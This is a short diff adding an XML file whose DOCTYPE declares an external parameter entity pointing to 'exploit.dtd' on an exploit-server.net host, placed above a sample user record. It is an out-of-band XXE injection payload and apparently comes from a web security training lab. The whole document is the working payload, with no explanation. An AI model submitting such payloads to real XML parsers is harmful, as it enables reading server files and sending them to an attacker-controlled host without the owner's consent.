@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="UTF-8"?> 
+<!DOCTYPE test [<!ENTITY % xxe SYSTEM "https://exploit
+0acc000a049bd2aec0ca109201ff0073.exploit-server.net/exploit.dtd"> %xxe;]> 
+<users> 
+<user> 
+<username>Example1</username> 
+<email>example1@domain.com</email> 
+</user> 
+</users>
